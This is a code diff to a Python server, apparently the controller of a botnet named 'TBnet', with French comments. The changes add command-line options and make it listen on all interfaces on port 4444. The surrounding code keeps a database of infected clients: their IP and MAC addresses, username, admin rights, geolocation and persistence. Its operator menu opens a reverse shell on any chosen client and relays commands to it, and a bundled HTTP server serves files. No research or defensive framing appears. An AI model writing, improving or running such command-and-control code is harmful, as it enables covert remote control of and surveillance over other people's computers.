@@ -8,10 +8,45 @@ import inspect
 import json
 import http.server
 import socketserver
+import argparse
 
 tid_clients = {}
 pathDb = "./clients/"
 extDb = ".json"
+
+image = """ _______  ______                __
+|_     _||   __ \.-----..-----.|  |_
+  |   |  |   __ <|     ||  -__||   _|
+  |___|  |______/|__|__||_____||____|
+"""
+
+### GESTION ARGUMENTS
+
+print(image)
+parser = argparse.ArgumentParser(description='TBnet Serveur Menu D\'aide :')
+parser.add_argument('--host', 
+                    type=str, 
+                    required=False, 
+                    dest='host',
+                    default="",
+                    help='Ip d\'ecoute du seveur (defaut : Any)')
+parser.add_argument('--port', 
+                    type=int, 
+                    required=False, 
+                    dest='port',
+                    default=4444,
+                    help='Port découte du Serveur (defaut : 4444)')
+parser.add_argument('--debug',
+                    action='store_const',
+                    const=True,
+                    required=False,
+                    dest='debug',
+                    default=False,
+                    help='Active le mode Debug du serveur')
+
+args = parser.parse_args()
+
+#########################
 
 def _async_raise(tid, exctype):
     """raises the exception, performs cleanup if needed"""
@@ -38,9 +73,6 @@ class Threads:
 
     thread_id = 0
     thread_name = "null"
-
-    def __init__(self):
-        print("Initialisation ")
 
     def StartThread(self, fonction, arg1 = "", arg2 = "" ,arg3 = ""):
         if "Run" in fonction:
@@ -100,7 +132,7 @@ def LireClient(nom_fichier):
 def TrouverMac(nom_fichier):
     fichier = open(pathDb + nom_fichier, "r")
     data = json.load(fichier)
-    print(data["mac_address"])
+    #print(data["mac_address"])
     fichier.close
     return data["mac_address"]
 
@@ -163,10 +195,8 @@ def TestMacAddress(path,extension,macAddress):
             count += 1
             fileName, fileExtension = os.path.splitext(file)
             if TrouverMac(fileName + fileExtension) == macAddress:
-                print("l'adresse mac corespond")
+                #print("l'adresse mac corespond")
                 return True, fileName + fileExtension
-            else:
-                print("l'adresse mac ne corespond pas")
     return False, "Null"
 
 def CountClients(path):
@@ -200,7 +230,7 @@ def AfficherClients(path):
                 ipv4 = data["ipv4"]
                 persistance = data["persistance"]
                 file.close()
-                print("\t\tListe clients :")
+                print("\n\t\tListe clients :")
                 print("\nNumero Client : %s\n\tPlatform : %s\
                 \n\tPublic ip : %s\n\tLocal ip : %s\n\tMac address : %s\n\tArchitecture : %s\
                 \n\tDevice : %s\n\tUsername : %s\n\tAdministrator : %s\n\tGeolocation : %s\
@@ -210,8 +240,8 @@ def AfficherClients(path):
 
 class Server:
 
-    host = '127.0.0.1'
-    port = 4444
+    host = args.host
+    port = args.port
     BUFFER_SIZE = 1024 * 128
     ThreadCount = 0
     current_sessions = 0
@@ -222,17 +252,17 @@ class Server:
     menu_help = "\thelp -- Afficher le Menu d'aide\n\tshell [numero du client]\
      -- Ouvrir un reverse shell sur un client. Exemple : shell 2\n"
 
-    def __init__(self):
-        print("Initialisation ")
-        #self.run()
-
     def run(self):
         ServerSocket = socket.socket()
         try:
             ServerSocket.bind((self.host, self.port))
         except socket.error as e:
             print(str(e))
-        print("Lancement du server sur : " + self.host + " " + str(self.port))
+        if self.host == "":
+            addr = "0.0.0.0"
+        else:
+            addr = self.host
+        print("Lancement du serveur sur : " + addr + " " + str(self.port))
         ServerSocket.listen(5)
         self.ThreadCount = CountClients(pathDb)
         while True:
@@ -274,7 +304,7 @@ class Server:
             if "shell" in self.ordre:
                 if str(id_conn) in self.ordre:
                     self.current_sessions = id_conn
-                    print("prise en main de la sessions " + str(id_conn) + "\n")
+                    print("Ouverture d'un Reverse Shell sur la session : " + str(id_conn) + "\n")
                     while True:
                         if self.current_sessions == id_conn:
                             cmd = input(f"{str(id_conn)} : {pwd} $> ")
@@ -324,10 +354,10 @@ class Server:
         while True:
             if self.local == True:
                 if self.current_sessions == 0:  
-                    lcmd = input("local : ")
+                    lcmd = input("TBnet => ")
                     #print(lcmd + " local")
                     self.ordre = lcmd
-                    print(self.ordre)
+                    #print(self.ordre)
                     if "help" in lcmd:
                         print(self.menu_help)
                     if "exit" in lcmd:
@@ -340,11 +370,12 @@ class Server:
                         self.ordre = ""
                         lcmd = ""
                         self.local = False
+            time.sleep(0.1)
 
     def StartHttp(self):
         ADDR = self.host
         PORT = (self.port + 1)
-        print(ADDR +" " + str(PORT))
+        #print(ADDR +" " + str(PORT))
         DIRECTORY = "./http/"
         if not os.path.exists("./http/"):
             os.makedirs("./http/")
@@ -356,12 +387,12 @@ class Server:
                 pass
 
         with socketserver.TCPServer(("", PORT), Handler) as httpd:
-            print("serving at port", PORT)
+            print("Port d'écoute web : ", PORT)
             httpd.serve_forever()
 
 
     def LaunchThread(self, fonction, arg1 = "", arg2 = "", arg3 = ""):
-        print(fonction)
+        #print(fonction)
         t = Threads()
         t.StartThread(fonction, arg1, arg2 ,arg3)
         return t
@@ -374,7 +405,7 @@ if os.path.exists(pathDb) != True:
     os.makedirs(pathDb)
 
 s = Server()
-#s.run()
+
 listen_service = s.LaunchThread("Run")
 http_service = s.LaunchThread("StartHttp")
 time.sleep(1)
